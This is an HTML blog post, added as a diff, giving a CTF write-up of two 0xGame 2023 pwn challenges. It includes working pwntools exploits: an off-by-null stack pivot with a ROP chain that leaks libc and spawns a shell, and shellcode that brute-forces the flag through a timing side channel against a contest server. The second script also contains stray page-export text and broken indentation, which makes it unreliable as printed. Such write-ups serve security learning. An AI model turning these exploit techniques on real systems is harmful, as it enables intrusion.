@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0xgame2023 Pwn WpWeek3 没了溢出，你能秒我？1poison-stack-base  12345678int vuln()&#123;  char v1[256]; &#x2F;&#x2F; [rsp+0h] [rbp-100h] BYREF  puts(&quot;Try perform ROP!&quot;);  custom_gets_off_by_one_or_null((__int64)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0xgame2023 Pwn Wp">
+<meta property="og:url" content="http://example.com/2023/11/08/0xgame2023%20Pwn%20Wp/index.html">
+<meta property="og:site_name" content="n0we11&#39;s learning blog">
+<meta property="og:description" content="0xgame2023 Pwn WpWeek3 没了溢出，你能秒我？1poison-stack-base  12345678int vuln()&#123;  char v1[256]; &#x2F;&#x2F; [rsp+0h] [rbp-100h] BYREF  puts(&quot;Try perform ROP!&quot;);  custom_gets_off_by_one_or_null((__int64)">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="c:\Users\hp\Desktop\%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231108165721.png">
+<meta property="article:published_time" content="2023-11-08T09:05:59.481Z">
+<meta property="article:modified_time" content="2023-11-23T15:32:28.963Z">
+<meta property="article:author" content="n0we11">
+<meta property="article:tag" content="WP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:\Users\hp\Desktop\%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231108165721.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>0xgame2023 Pwn Wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/11/23/hectfandhws/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/10/20/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/11/08/0xgame2023%20Pwn%20Wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/11/08/0xgame2023%20Pwn%20Wp/&text=0xgame2023 Pwn Wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/11/08/0xgame2023%20Pwn%20Wp/&title=0xgame2023 Pwn Wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/11/08/0xgame2023%20Pwn%20Wp/&is_video=false&description=0xgame2023 Pwn Wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=0xgame2023 Pwn Wp&body=Check out this article: http://example.com/2023/11/08/0xgame2023%20Pwn%20Wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/11/08/0xgame2023%20Pwn%20Wp/&title=0xgame2023 Pwn Wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/11/08/0xgame2023%20Pwn%20Wp/&title=0xgame2023 Pwn Wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/11/08/0xgame2023%20Pwn%20Wp/&title=0xgame2023 Pwn Wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/11/08/0xgame2023%20Pwn%20Wp/&title=0xgame2023 Pwn Wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/11/08/0xgame2023%20Pwn%20Wp/&name=0xgame2023 Pwn Wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/11/08/0xgame2023%20Pwn%20Wp/&t=0xgame2023 Pwn Wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0xgame2023-Pwn-Wp"><span class="toc-number">1.</span> <span class="toc-text">0xgame2023 Pwn Wp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Week3-%E6%B2%A1%E4%BA%86%E6%BA%A2%E5%87%BA%EF%BC%8C%E4%BD%A0%E8%83%BD%E7%A7%92%E6%88%91%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">Week3 没了溢出，你能秒我？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Week4"><span class="toc-number">1.2.</span> <span class="toc-text">Week4</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        0xgame2023 Pwn Wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">n0we11</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-11-08T09:05:59.481Z" class="dt-published" itemprop="datePublished">2023-11-08</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/WP/" rel="tag">WP</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="0xgame2023-Pwn-Wp"><a href="#0xgame2023-Pwn-Wp" class="headerlink" title="0xgame2023 Pwn Wp"></a>0xgame2023 Pwn Wp</h2><h3 id="Week3-没了溢出，你能秒我？"><a href="#Week3-没了溢出，你能秒我？" class="headerlink" title="Week3 没了溢出，你能秒我？"></a>Week3 没了溢出，你能秒我？</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poison-stack-base</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try perform ROP!&quot;</span>);</span><br><span class="line">  custom_gets_off_by_one_or_null((__int64)v1, <span class="number">256</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Good luck!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​		custom_gets_off_by_one_or_null里存在一字节溢出，使得rbp低位被\x00覆盖。经过vuln和main两个函数的leave;ret之后，rsp会指向我们低位写0的rbp，从而完成抬栈。<br>​		而后我们可以在栈中写ROP链，赌原先的rbp的低位值足够大，从而在被\x00覆盖后有足够大的空间来写ROP链，当然rop链尽量写的短一点最好。<br>​		<strong>EXP</strong>：	</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io=remote(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x401393</span></span><br><span class="line">pop_rsi=<span class="number">0x401391</span></span><br><span class="line">payload=p64(pop_rdi+<span class="number">1</span>)*<span class="number">28</span>+flat(pop_rdi,elf.got[<span class="string">&#x27;puts&#x27;</span>],elf.plt[<span class="string">&#x27;puts&#x27;</span>],<span class="number">0x401259</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf.sym.main))</span><br><span class="line">io.sendafter(<span class="string">&#x27;Try perform ROP!\n&#x27;</span>,payload)</span><br><span class="line">io.recvline()</span><br><span class="line">libcbase=u64(io.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">payload=p64(pop_rdi+<span class="number">1</span>)*<span class="number">25</span>+flat(pop_rdi,libcbase+<span class="number">0x1b45bd</span>,pop_rsi,<span class="number">0</span>,<span class="number">0</span>,libcbase+<span class="number">0x52290</span>)</span><br><span class="line">io.sendafter(<span class="string">&#x27;Try perform ROP!\n&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>小注意</strong>：</p>
+<ul>
+<li><p>再回到函数主体时,入口不能直接是函数地址,因为其第一条指令为push rbp,显然矛盾,移到下一条指令.</p>
+</li>
+<li><p>​		再回到main函数的入口时不能直接用函数的起始地址，如下图，起始地址的第一条指令为push rbp，显然nn有所冲突，所以下移到其下一条指令。</p>
+</li>
+</ul>
+<p>​		<img src="C:\Users\hp\Desktop\微信截图_20231108165721.png"></p>
+<p>Rop链前部分写ret指令</p>
+<h3 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h3><p>读入十个字节去执行，可以实现一个read。然后在ORloop进行侧信道攻击。把flag读入内存，然后判断是不是指定值，如果不是就退出，是就进入死循环。依次判断。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_v</span>(<span class="params">offset, v</span>):</span><br><span class="line">    p = remote(<span class="string">&#x27;8.130.35.16&#x27;</span>, <span class="number">54000</span>)</span><br><span class="line">    <span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">    <span class="comment">#读文件</span></span><br><span class="line">    pay2 = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)+shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,target,<span class="number">0x40</span>)</span><br><span class="line">    pay2 += <span class="string">f&#x27;lab: mov rax, 0x<span class="subst">&#123;offset:x&#125;</span>;mov cl,byte ptr [rax]; cmp cl, <span class="subst">&#123;v&#125;</span>; je lab;&#x27;</span> + shellcraft.exit(<span class="number">0</span>)</span><br><span class="line">    s2 = <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x10</span>+asm(pay2)</span><br><span class="line">    pay = <span class="string">&quot;xor edi,edi;push rdx;pop rsi;syscall;&quot;</span></span><br><span class="line">    p.sendafter(<span class="string">b&quot;Now show me your code:\n&quot;</span>, asm(pay).ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x90&#x27;</span>)+s2)</span><br><span class="line">    p.recvline()</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.recv(timeout=<span class="number">0.3</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="comment">#p.interactive()</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">target = <span class="number">0x20230200</span> <span class="comment">#写目录和文件</span></span><br><span class="line">name = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line"> </span><br><span class="line">dic = <span class="string">b&#x27;0123456789-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_&#125;&#x27;</span> </span><br><span class="line">name = <span class="string">&#x27;0xGame&#123;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">if</span> read_v(target+<span class="built_in">len</span>(name), i):</span><br><span class="line">            name += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;name:&#x27;</span>,name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="comment">#break</span></span><br><span class="line">    <span class="comment">#break</span></span><br></pre></td></tr></table></figure>
+
+<p>  也可以二分法查找，加速爆破：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;info&#x27;</span>)</span></span><br><span class="line">flag=<span class="string">&quot;0xGame&#123;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>: </span><br><span class="line"> curr_pos=len(flag)</span><br><span class="line"> left=<span class="number">32</span></span><br><span class="line"> right=<span class="number">126</span></span><br><span class="line"> <span class="keyword">while</span> left!=right:</span><br><span class="line"> warning(f<span class="string">&quot;&#123;curr_pos&#125;: &#123;left&#125;~&#123;right&#125;&quot;</span>)</span><br><span class="line"> <span class="meta">#s=process(<span class="string">&quot;../dist/pwn&quot;</span>)</span></span><br><span class="line"> s=remote(<span class="string">&quot;8.130.35.16&quot;</span>,<span class="number">54000</span>)</span><br><span class="line"> <span class="meta">#pause()</span></span><br><span class="line"> s.sendafter(b<span class="string">&quot;code:\n&quot;</span>,<span class="keyword">asm</span>(<span class="string">&quot;push rdx;pop rsi;push rdx;pop r15;xor</span></span><br><span class="line"><span class="string">rdi,rdi;xor rax,rax;syscall&quot;</span>))</span><br><span class="line"> mid=<span class="type">int</span>((left+right)/<span class="number">2</span>)</span><br><span class="line"> scbase=f<span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"> push r15</span></span><br><span class="line"><span class="string"> pop rdi</span></span><br><span class="line"><span class="string"> xor rsi,rsi</span></span><br><span class="line"><span class="string"> xor rdx,rdx</span></span><br><span class="line"><span class="string"> push 2</span></span><br><span class="line"><span class="string"> pop rax</span></span><br><span class="line"><span class="string"> syscall</span></span><br><span class="line"><span class="string"> push rdi</span></span><br><span class="line"><span class="string"> pop rsi</span></span><br><span class="line"><span class="string"> add rsi,0x600</span></span><br><span class="line"><span class="string">week4-pwn-wp.md 2023-10-31</span></span><br><span class="line"><span class="string">3 / 4</span></span><br><span class="line"><span class="string"> push rax</span></span><br><span class="line"><span class="string"> pop rdi</span></span><br><span class="line"><span class="string"> xor rax,rax</span></span><br><span class="line"><span class="string"> inc dh</span></span><br><span class="line"><span class="string"> syscall</span></span><br><span class="line"><span class="string"> push rsi</span></span><br><span class="line"><span class="string"> pop r14</span></span><br><span class="line"><span class="string"> cmp byte ptr [r14+&#123;curr_pos&#125;],&#123;mid&#125;</span></span><br><span class="line"><span class="string"> ja loop</span></span><br><span class="line"><span class="string"> push 0x3b</span></span><br><span class="line"><span class="string"> pop rax</span></span><br><span class="line"><span class="string"> syscall</span></span><br><span class="line"><span class="string"> loop:</span></span><br><span class="line"><span class="string"> jmp loop</span></span><br><span class="line"><span class="string"> &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"> s.recvline()</span><br><span class="line"> <span class="meta">#pause()</span></span><br><span class="line"> s.send(b<span class="string">&quot;flag\0&quot;</span>.ljust(<span class="number">0x10</span>,b<span class="string">&quot;\x90&quot;</span>)+<span class="keyword">asm</span>(scbase))</span><br><span class="line"> <span class="meta">#pause()</span></span><br><span class="line"> try:</span><br><span class="line"> dat=s.recv(timeout=<span class="number">1</span>)</span><br><span class="line"> except EOFError:</span><br><span class="line"> right=mid</span><br><span class="line"> s.close()</span><br><span class="line"> <span class="keyword">continue</span></span><br><span class="line"> left=mid+<span class="number">1</span></span><br><span class="line"> <span class="meta">#pause()</span></span><br><span class="line"> s.close()</span><br><span class="line"> flag+=chr(left)</span><br><span class="line"> warning(flag)</span><br><span class="line"> <span class="keyword">if</span> flag[<span class="number">-1</span>]==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line"> success(flag)</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0xgame2023-Pwn-Wp"><span class="toc-number">1.</span> <span class="toc-text">0xgame2023 Pwn Wp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Week3-%E6%B2%A1%E4%BA%86%E6%BA%A2%E5%87%BA%EF%BC%8C%E4%BD%A0%E8%83%BD%E7%A7%92%E6%88%91%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">Week3 没了溢出，你能秒我？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Week4"><span class="toc-number">1.2.</span> <span class="toc-text">Week4</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/11/08/0xgame2023%20Pwn%20Wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/11/08/0xgame2023%20Pwn%20Wp/&text=0xgame2023 Pwn Wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/11/08/0xgame2023%20Pwn%20Wp/&title=0xgame2023 Pwn Wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/11/08/0xgame2023%20Pwn%20Wp/&is_video=false&description=0xgame2023 Pwn Wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=0xgame2023 Pwn Wp&body=Check out this article: http://example.com/2023/11/08/0xgame2023%20Pwn%20Wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/11/08/0xgame2023%20Pwn%20Wp/&title=0xgame2023 Pwn Wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/11/08/0xgame2023%20Pwn%20Wp/&title=0xgame2023 Pwn Wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/11/08/0xgame2023%20Pwn%20Wp/&title=0xgame2023 Pwn Wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/11/08/0xgame2023%20Pwn%20Wp/&title=0xgame2023 Pwn Wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/11/08/0xgame2023%20Pwn%20Wp/&name=0xgame2023 Pwn Wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/11/08/0xgame2023%20Pwn%20Wp/&t=0xgame2023 Pwn Wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    n0we11
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
